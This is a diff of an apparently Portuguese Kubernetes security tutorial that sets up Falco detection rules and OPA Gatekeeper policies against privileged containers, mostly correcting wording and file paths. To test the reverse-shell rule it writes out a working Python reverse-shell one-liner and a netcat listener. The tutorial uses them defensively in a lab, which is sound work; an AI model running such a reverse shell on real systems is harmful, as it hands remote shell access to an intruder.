@@ -467,7 +467,7 @@ EOF
 
 
 
-Falco
+Falco:
 ---
 https://falco.org/
 
@@ -483,7 +483,7 @@ apt-get install -y falco
 
 
 
-***Primeira rule: Shell Reversa***
+***Primeira regra: Shell Reversa***
 ```
 - rule: Reverse shell
   desc: Detect reverse shell established remote connection
@@ -496,20 +496,22 @@ apt-get install -y falco
 ```
 
 
-***Testando a role:***
+***Testando a regra:***
 ```
+
 Node: Nginx
 
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.142.0.42",32000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+kubectl exec -it nginx -- bash
+apt install python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP do Control Plane",32000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
 
 
 
-Control Plane
-
+Control Plane:
 nc  -l 32000
 ```
 
-***Segunda role: container privilegiado***
+***Segunda regra: container privilegiado***
 ```
 - rule: Launch Privileged Container
   desc: Detect the initial process started in a privileged container. Exceptions are made for known trusted images.
@@ -525,7 +527,7 @@ nc  -l 32000
 
 
 
-OPA
+OPA:
 ---
 
 https://open-policy-agent.github.io/gatekeeper/website/docs/install/
@@ -539,7 +541,7 @@ kubectl apply -f https://raw.githubusercontent.com/open-policy-agent/gatekeeper/
 
 ***Exclud NS***
 ```
-cat > /excludns.yaml <<EOF
+cat > excludns.yaml <<EOF
 apiVersion: config.gatekeeper.sh/v1alpha1
 kind: Config
 metadata:
@@ -555,7 +557,7 @@ EOF
 
 ***Criando o primeiro template:***
 ```
-cat > /tmp/constrainttemplate.yaml <<EOF
+cat > constrainttemplate.yaml <<EOF
 apiVersion: templates.gatekeeper.sh/v1beta1
 kind: ConstraintTemplate
 metadata:
@@ -587,7 +589,7 @@ EOF
 ```
 ***Criando constraint:***
 ```
-cat > /tmp/constraint.yaml <<EOF
+cat > constraint.yaml <<EOF
 apiVersion: constraints.gatekeeper.sh/v1beta1
 kind: PrivilegedContainer
 metadata:
@@ -607,7 +609,7 @@ kubectl get constrainttemplate
 
 ***Criando pod de teste:***
 ```
-cat > /tmp/example.yaml <<EOF
+cat > pod.yaml <<EOF
 apiVersion: v1
 kind: Pod
 metadata:
@@ -622,7 +624,7 @@ spec:
       privileged: true
 EOF
 
-kubectl create -f /tmp/example.yaml
+kubectl create -f pod.yaml
 ```
 
 
